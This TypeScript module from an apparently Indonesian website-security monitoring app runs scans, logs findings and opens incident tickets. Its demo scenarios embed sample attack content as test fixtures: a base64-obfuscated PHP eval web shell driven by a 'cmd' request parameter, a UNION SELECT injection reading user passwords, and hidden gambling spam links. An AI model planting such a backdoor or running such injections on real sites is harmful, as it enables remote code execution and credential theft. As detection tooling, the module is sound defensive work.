import 'server-only';

import { randomUUID } from 'node:crypto';
import { and, desc, eq, gte, sql } from 'drizzle-orm';
import { db } from '@/server/db';
import {
  incidents,
  malwareSignatures,
  profiles,
  scanLogs,
  webAssets,
  type ScanFinding,
  type ScanMode,
} from '@/server/db/schema';
import { analyzeHtmlForThreats, type AnalyzableSignature } from '@/lib/scannerMath';
import { computeSlaDeadlinesPure } from '@/lib/slaMath';
import { newTicketNumber } from '@/server/services/ticketNumber';
import { notify } from '@/server/services/notifications';

export type ScanModeValue = ScanMode;
export type ScanTriggerValue = 'SCHEDULED' | 'MANUAL';

/** Preset HTML scenarios for the demo/sandbox mode on /assets/[id]. */
export type ScanScenario =
  | 'CLEAN'
  | 'SLOT_DEFACEMENT'
  | 'SQLI_ERROR'
  | 'MALWARE_BACKDOOR'
  | 'SERVER_DOWN'
  | 'SSL_EXPIRED';

export interface ScenarioPreset {
  id: ScanScenario;
  label: string;
  description: string;
}

export const SCAN_SCENARIOS: ScenarioPreset[] = [
  {
    id: 'CLEAN',
    label: 'Bersih',
    description: 'Halaman normal tanpa temuan. Aset tetap HEALTHY.',
  },
  {
    id: 'SLOT_DEFACEMENT',
    label: 'Defacement Slot',
    description: 'Injeksi tautan judi slot di elemen tersembunyi. Memicu tiket kritis.',
  },
  {
    id: 'SQLI_ERROR',
    label: 'Error SQL Injection',
    description: 'Halaman membocorkan galat kueri basis data. Memicu tiket tinggi.',
  },
  {
    id: 'MALWARE_BACKDOOR',
    label: 'Backdoor Malware',
    description: 'Fungsi PHP berbahaya untuk eksekusi kode jarak jauh.',
  },
  {
    id: 'SERVER_DOWN',
    label: 'Server Down',
    description: 'Simulasi server tidak merespons (HTTP 503).',
  },
  {
    id: 'SSL_EXPIRED',
    label: 'SSL Kedaluwarsa',
    description: 'Sertifikat sudah berakhir, situs berstatus WARNING.',
  },
];

export interface RunScanInput {
  assetId: string;
  mode: ScanModeValue;
  trigger: ScanTriggerValue;
  scenario?: ScanScenario;
  actorId?: string | null;
  /** Pre-fetched HTML. Only used in LIVE mode when a fetch was already done. */
  html?: string;
  headers?: Record<string, string | undefined>;
  /** Skip automatic incident creation (used by the sandbox analyzer). */
  skipAutomation?: boolean;
}

export interface RunScanResult {
  scanId: string;
  httpStatus: number | null;
  responseTimeMs: number | null;
  sslValid: boolean | null;
  domHashMatched: boolean | null;
  threatsDetected: number;
  findings: ScanFinding[];
  summary: string;
  healthStatus: (typeof webAssets.healthStatus.enumValues)[number];
  /** Incident created automatically, if any. */
  incidentId: string | null;
  ticketNumber: string | null;
}

/* -------------------------------------------------------------------------- */
/* Simulated content per scenario                                             */
/* -------------------------------------------------------------------------- */

const SCENARIO_HTML: Record<ScanScenario, { html: string; status: number; sslValid: boolean }> = {
  CLEAN: {
    status: 200,
    sslValid: true,
    html: `<!doctype html>
<html lang="id">
<head>
  <meta charset="utf-8">
  <title>Jurnal Nusantara — Vol 12 No 2</title>
  <meta name="description" content="Jurnal ilmiah berkala Fakultas Teknik">
  <link rel="canonical" href="https://journal.nusantara.ac.id/">
</head>
<body>
  <header><a href="/">Beranda</a> <a href="/archive">Arsip</a></header>
  <main>
    <h1>Analisis Sistem Informasi Geografis</h1>
    <p>Abstrak artikel edisi terbaru.</p>
  </main>
  <footer>© 2026 Universitas Nusantara</footer>
</body>
</html>`,
  },
  SLOT_DEFACEMENT: {
    status: 200,
    sslValid: true,
    html: `<!doctype html>
<html lang="id">
<head>
  <title>Jurnal Nusantara</title>
  <meta name="description" content="Jurnal ilmiah">
</head>
<body>
  <header><a href="/">Beranda</a></header>
  <main>
    <h1>Analisis Sistem Informasi Geografis</h1>
    <p>Abstrak artikel edisi terbaru.</p>
  </main>
  <div style="display:none;position:absolute;left:-9999px">
    <a href="https://slot-gacor-maxwin.example/daftar">slot gacor maxwin hari ini</a>
    <a href="https://rtp-live-slot.example/">rtp live tertinggi</a>
    <a href="https://judol-online.example/sbobet">sbobet terpercaya</a>
  </div>
  <footer>© 2026 Universitas Nusantara</footer>
</body>
</html>`,
  },
  SQLI_ERROR: {
    status: 500,
    sslValid: true,
    html: `<!doctype html>
<html><head><title>Database Error</title></head>
<body>
  <h1>Galat Basis Data</h1>
  <pre>You have an error in your SQL syntax; check the manual that corresponds to
your MySQL server version for the right syntax to use near
'UNION SELECT user, password FROM users --' at line 1</pre>
  <p>Query: SELECT * FROM articles WHERE id = 1 UNION SELECT user, password FROM users --</p>
  <p>information_schema.tables</p>
</body></html>`,
  },
  MALWARE_BACKDOOR: {
    status: 200,
    sslValid: true,
    html: `<!doctype html>
<html><head><title>Jurnal</title></head>
<body>
  <h1>Jurnal Nusantara</h1>
  <!-- injected plugin file -->
  <?php eval(base64_decode("aWYgKGlzc2V0KCRfUkVRVUVTVFsnY21kJ10pKSB7ZXZhbChiYXNlNjRfZGVjb2RlKCRfUkVRVUVTVFsnY21kJ10pKTt9")); ?>
  <p>Silakan hubungi redaksi.</p>
</body></html>`,
  },
  SERVER_DOWN: {
    status: 503,
    sslValid: false,
    html: `<html><head><title>503 Service Unavailable</title></head>
<body><h1>Service Unavailable</h1><p>Database connection failed.</p></body></html>`,
  },
  SSL_EXPIRED: {
    status: 200,
    sslValid: false,
    html: `<!doctype html>
<html lang="id"><head><title>Jurnal Nusantara</title></head>
<body><h1>Selamat datang</h1><p>Sertifikat keamanan telah berakhir.</p></body></html>`,
  },
};

/* -------------------------------------------------------------------------- */
/* Public API                                                                 */
/* -------------------------------------------------------------------------- */

/** All active signatures, ready for the analyzer. */
export async function loadActiveSignatures(): Promise<AnalyzableSignature[]> {
  const rows = await db
    .select()
    .from(malwareSignatures)
    .where(eq(malwareSignatures.isActive, true));
  return rows as AnalyzableSignature[];
}

/**
 * Run a scan against an asset and record it.
 *
 * In SIMULATED mode nothing leaves the machine: a preset HTML document is
 * analyzed with the real engine, which keeps the demo honest about detection
 * quality without sending traffic to third-party sites.
 */
export async function runAssetScan(input: RunScanInput): Promise<RunScanResult> {
  const asset = await db
    .select()
    .from(webAssets)
    .where(eq(webAssets.id, input.assetId))
    .limit(1)
    .then((r) => r[0]);

  if (!asset) throw new Error('Aset tidak ditemukan.');

  const scenario = input.scenario ?? 'CLEAN';
  const preset = SCENARIO_HTML[scenario];

  const html =
    input.mode === 'LIVE' && input.html !== undefined
      ? input.html
      : preset.html;
  const httpStatus =
    input.mode === 'LIVE' && input.html !== undefined ? (input.headers?.['x-simulated-status'] ? Number(input.headers['x-simulated-status']) : 200) : preset.status;
  const sslValid =
    input.mode === 'LIVE' && input.html !== undefined
      ? input.headers?.['x-simulated-ssl'] !== 'false'
      : preset.sslValid;

  const startedAt = Date.now();
  const signatures = await loadActiveSignatures();
  const analysis = analyzeHtmlForThreats(html, signatures, {
    headers: input.headers ?? defaultHeaders(),
  });
  const responseTimeMs = Date.now() - startedAt + simulatedLatency(scenario);

  const domHashMatched = asset.baselineDomHash
    ? asset.baselineDomHash === analysis.domHash
    : null;

  // Server-down scenarios are detected from the status code, not the body.
  const serverDown = httpStatus >= 500;
  const sslExpired = sslValid === false;

  const effectiveFindings: ScanFinding[] = [...analysis.signatureFindings];
  if (serverDown) {
    effectiveFindings.push({
      signatureId: null,
      signatureName: 'Server Tidak Merespons',
      category: 'SERVER_DOWN',
      severity: 'CRITICAL',
      pattern: `HTTP ${httpStatus}`,
      matchedText: `Status HTTP ${httpStatus}`,
      lineNumber: 0,
      context: `Server mengembalikan status ${httpStatus}.`,
      reason: 'Server tidak merespons atau mengembalikan galat 5xx.',
    });
  }
  if (sslExpired) {
    effectiveFindings.push({
      signatureId: null,
      signatureName: 'Sertifikat SSL Tidak Valid',
      category: 'SSL_EXPIRED',
      severity: 'HIGH',
      pattern: 'ssl_valid = false',
      matchedText: 'Sertifikat SSL tidak valid atau kedaluwarsa',
      lineNumber: 0,
      context: 'Handshake TLS gagal atau sertifikat kedaluwarsa.',
      reason: 'Sertifikat SSL sudah berakhir atau tidak valid.',
    });
  }

  const threatsDetected = effectiveFindings.length;
  const maxSeverity = pickWorst(effectiveFindings.map((f) => f.severity));

  const healthStatus = deriveHealthStatus({
    scenario,
    httpStatus,
    sslValid,
    maxSeverity,
  });

  const summary = buildScanSummary({
    assetName: asset.name,
    scenario,
    httpStatus,
    sslValid,
    threatsDetected,
    domHashMatched,
    maxSeverity,
  });

  const scanId = randomUUID();

  await db.insert(scanLogs).values({
    id: scanId,
    assetId: asset.id,
    triggeredBy: input.trigger,
    scanMode: input.mode,
    httpStatus,
    responseTimeMs,
    sslValid,
    domHashMatched,
    threatsDetected,
    findingsJson: effectiveFindings,
    summary,
    createdBy: input.actorId ?? null,
  });

  // Recompute SSL days remaining from the stored expiry.
  const sslDaysRemaining = asset.sslExpiryDate
    ? daysBetween(new Date(), asset.sslExpiryDate)
    : null;

  await db
    .update(webAssets)
    .set({
      healthStatus,
      lastScanAt: new Date(),
      sslDaysRemaining,
      version: sql`${webAssets.version} + 1`,
      updatedAt: new Date(),
    })
    .where(eq(webAssets.id, asset.id));

  // Automatic incident creation (idempotent alert-to-ticket).
  let incidentId: string | null = null;
  let ticketNumber: string | null = null;

  if (!input.skipAutomation && shouldCreateIncident({ maxSeverity, httpStatus })) {
    const created = await createIncidentFromScan({
      asset,
      findings: effectiveFindings,
      maxSeverity,
      scenario,
      actorId: input.actorId ?? null,
    });
    incidentId = created.incidentId;
    ticketNumber = created.ticketNumber;
  }

  return {
    scanId,
    httpStatus,
    responseTimeMs,
    sslValid,
    domHashMatched,
    threatsDetected,
    findings: effectiveFindings,
    summary,
    healthStatus,
    incidentId,
    ticketNumber,
  };
}

/**
 * Analyze pasted HTML without touching the database.
 * Powers the /scanner sandbox.
 */
export async function analyzeSandboxHtml(html: string): Promise<{
  findings: ScanFinding[];
  hiddenLinks: ReturnType<typeof analyzeHtmlForThreats>['hiddenLinks'];
  headerFindings: ReturnType<typeof analyzeHtmlForThreats>['headerFindings'];
  domHash: string;
  threatCount: number;
  maxSeverity: string | null;
  summary: string;
}> {
  const signatures = await loadActiveSignatures();
  const analysis = analyzeHtmlForThreats(html, signatures);
  return {
    findings: analysis.signatureFindings,
    hiddenLinks: analysis.hiddenLinks,
    headerFindings: analysis.headerFindings,
    domHash: analysis.domHash,
    threatCount: analysis.threatCount,
    maxSeverity: analysis.maxSeverity,
    summary: analysis.summary,
  };
}

/** Set (or refresh) the DOM baseline hash for an asset. */
export async function setBaselineDomHash(
  assetId: string,
  hash: string,
): Promise<void> {
  await db
    .update(webAssets)
    .set({ baselineDomHash: hash, updatedAt: new Date() })
    .where(eq(webAssets.id, assetId));
}

/** True for a well-formed UUID — guards a dynamic segment before it hits a uuid column. */
function isUuid(value: string): boolean {
  return /^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i.test(
    value,
  );
}

/** Recent scans for an asset, newest first. */
export async function listAssetScans(assetId: string, limit = 20) {
  // Without this, a non-UUID id turns eq() on a uuid column into a Postgres
  // cast error and the page 500s instead of 404ing.
  if (!isUuid(assetId)) return [];
  return db
    .select()
    .from(scanLogs)
    .where(eq(scanLogs.assetId, assetId))
    .orderBy(desc(scanLogs.scannedAt))
    .limit(limit);
}

/* -------------------------------------------------------------------------- */
/* Internals                                                                  */
/* -------------------------------------------------------------------------- */

function defaultHeaders(): Record<string, string | undefined> {
  return {
    'content-type': 'text/html; charset=utf-8',
    server: 'nginx/1.24.0',
  };
}

function simulatedLatency(scenario: ScanScenario): number {
  switch (scenario) {
    case 'SERVER_DOWN':
      return 8_000;
    case 'SQLI_ERROR':
      return 1_850;
    default:
      return 240 + Math.floor(Math.random() * 180);
  }
}

function pickWorst(
  severities: Array<ScanFinding['severity']>,
): ScanFinding['severity'] | null {
  const rank: Record<string, number> = { CRITICAL: 0, HIGH: 1, MEDIUM: 2, LOW: 3 };
  let worst: ScanFinding['severity'] | null = null;
  for (const s of severities) {
    if (worst === null || rank[s]! < rank[worst]!) worst = s;
  }
  return worst;
}

function deriveHealthStatus(params: {
  scenario: ScanScenario;
  httpStatus: number;
  sslValid: boolean;
  maxSeverity: ScanFinding['severity'] | null;
}): (typeof webAssets.healthStatus.enumValues)[number] {
  if (params.httpStatus >= 500) return 'DOWN';
  if (params.scenario === 'SSL_EXPIRED') return 'WARNING';
  if (params.maxSeverity === 'CRITICAL' || params.maxSeverity === 'HIGH') {
    return 'COMPROMISED';
  }
  if (params.maxSeverity === 'MEDIUM') return 'WARNING';
  return 'HEALTHY';
}

function shouldCreateIncident(params: {
  maxSeverity: ScanFinding['severity'] | null;
  httpStatus: number;
}): boolean {
  if (params.httpStatus >= 500) return true;
  return params.maxSeverity === 'CRITICAL' || params.maxSeverity === 'HIGH';
}

function buildScanSummary(params: {
  assetName: string;
  scenario: ScanScenario;
  httpStatus: number;
  sslValid: boolean;
  threatsDetected: number;
  domHashMatched: boolean | null;
  maxSeverity: ScanFinding['severity'] | null;
}): string {
  const parts: string[] = [];
  parts.push(`HTTP ${params.httpStatus}`);
  parts.push(`SSL ${params.sslValid ? 'valid' : 'tidak valid'}`);
  parts.push(
    params.threatsDetected === 0
      ? 'tidak ada temuan'
      : `${params.threatsDetected} temuan${params.maxSeverity ? ` (tertinggi ${params.maxSeverity})` : ''}`,
  );
  if (params.domHashMatched === false) {
    parts.push('hash DOM berbeda dari baseline');
  }
  return `Pemindaian ${params.assetName}: ${parts.join(', ')}.`;
}

/**
 * Create an incident from scan findings, unless an open ticket for the same
 * category on the same asset already exists (idempotent alert-to-ticket).
 */
async function createIncidentFromScan(params: {
  asset: typeof webAssets.$inferSelect;
  findings: ScanFinding[];
  maxSeverity: ScanFinding['severity'] | null;
  scenario: ScanScenario;
  actorId: string | null;
}): Promise<{ incidentId: string; ticketNumber: string }> {
  const severity = (params.maxSeverity ?? 'MEDIUM') as (typeof incidents.severity.enumValues)[number];
  const category = pickWorstCategory(params.findings);

  // Guard against duplicate open tickets.
  const existing = await db
    .select({ id: incidents.id, ticketNumber: incidents.ticketNumber })
    .from(incidents)
    .where(
      and(
        eq(incidents.assetId, params.asset.id),
        eq(incidents.category, category),
        sql`${incidents.status} IN ('OPEN','INVESTIGATING','CONTAINED')`,
      ),
    )
    .limit(1);

  if (existing[0]) {
    return { incidentId: existing[0].id, ticketNumber: existing[0].ticketNumber };
  }

  // Reporter: fall back to the first SUPER_ADMIN so the FK is always satisfied.
  let reporterId = params.actorId;
  if (!reporterId) {
    const admin = await db
      .select({ id: profiles.id })
      .from(profiles)
      .where(eq(profiles.role, 'SUPER_ADMIN'))
      .limit(1);
    reporterId = admin[0]?.id ?? null;
  }
  if (!reporterId) {
    throw new Error('Tidak ada pengguna yang dapat dicatat sebagai pelapor tiket.');
  }

  const incidentId = randomUUID();
  const ticketNumber = await newTicketNumber('INC');
  const now = new Date();
  const deadlines = computeSlaDeadlinesPure(now, severity);

  const title = buildIncidentTitle(params.scenario, params.asset.name);
  const description = buildIncidentDescription(params.findings, params.asset);

  await db.insert(incidents).values({
    id: incidentId,
    ticketNumber,
    assetId: params.asset.id,
    reportedBy: reporterId,
    title,
    description,
    severity,
    category,
    status: 'OPEN',
    slaResponseDueAt: deadlines.responseDueAt,
    slaResolutionDueAt: deadlines.resolutionDueAt,
  });

  // Notify engineers and super admins.
  const recipients = await db
    .select({ id: profiles.id })
    .from(profiles)
    .where(sql`${profiles.role} IN ('SUPER_ADMIN','SECOPS_ENGINEER') AND ${profiles.isActive} = true`);

  for (const r of recipients) {
    await notify({
      recipientId: r.id,
      kind: category === 'SERVER_DOWN' ? 'ASSET_DOWN' : 'ASSET_COMPROMISED',
      title: `Ancaman terdeteksi: ${params.asset.name}`,
      body: `${ticketNumber} dibuat otomatis. ${description.slice(0, 200)}`,
      entityType: 'incident',
      entityId: incidentId,
    });
  }

  return { incidentId, ticketNumber };
}

function pickWorstCategory(
  findings: ScanFinding[],
): (typeof incidents.category.enumValues)[number] {
  const rank: Record<string, number> = { CRITICAL: 0, HIGH: 1, MEDIUM: 2, LOW: 3 };
  let best: ScanFinding | null = null;
  for (const f of findings) {
    if (best === null || rank[f.severity]! < rank[best.severity]!) best = f;
  }
  return (best?.category as (typeof incidents.category.enumValues)[number]) ?? 'CONFIGURATION_ERROR';
}

function buildIncidentTitle(scenario: ScanScenario, assetName: string): string {
  switch (scenario) {
    case 'SLOT_DEFACEMENT':
      return `Sisipan tautan judi slot terdeteksi pada ${assetName}`;
    case 'SQLI_ERROR':
      return `Indikasi SQL Injection pada ${assetName}`;
    case 'MALWARE_BACKDOOR':
      return `Backdoor malware terdeteksi pada ${assetName}`;
    case 'SERVER_DOWN':
      return `${assetName} tidak dapat diakses`;
    case 'SSL_EXPIRED':
      return `Sertifikat SSL ${assetName} tidak valid`;
    default:
      return `Temuan keamanan pada ${assetName}`;
  }
}

function buildIncidentDescription(
  findings: ScanFinding[],
  asset: typeof webAssets.$inferSelect,
): string {
  const lines = findings.slice(0, 12).map((f) => {
    const loc = f.lineNumber > 0 ? `baris ${f.lineNumber}` : 'respons server';
    return `- [${f.severity}] ${f.signatureName} (${loc}): ${f.reason}`;
  });
  return [
    `Pemindaian otomatis menemukan ${findings.length} temuan pada aset ${asset.name} (${asset.domainUrl}).`,
    '',
    ...lines,
  ].join('\n');
}

function daysBetween(from: Date, to: Date): number {
  const ms = to.getTime() - from.getTime();
  return Math.ceil(ms / 86_400_000);
}

/** Scans in the last N days, used by the DSS chronic-vulnerability rule. */
export async function countRecentThreatScans(
  assetId: string,
  windowDays: number,
): Promise<number> {
  const since = new Date(Date.now() - windowDays * 86_400_000);
  const rows = await db
    .select({ count: sql<number>`count(*)::int` })
    .from(scanLogs)
    .where(and(eq(scanLogs.assetId, assetId), gte(scanLogs.scannedAt, since), sql`${scanLogs.threatsDetected} > 0`));
  return rows[0]?.count ?? 0;
}
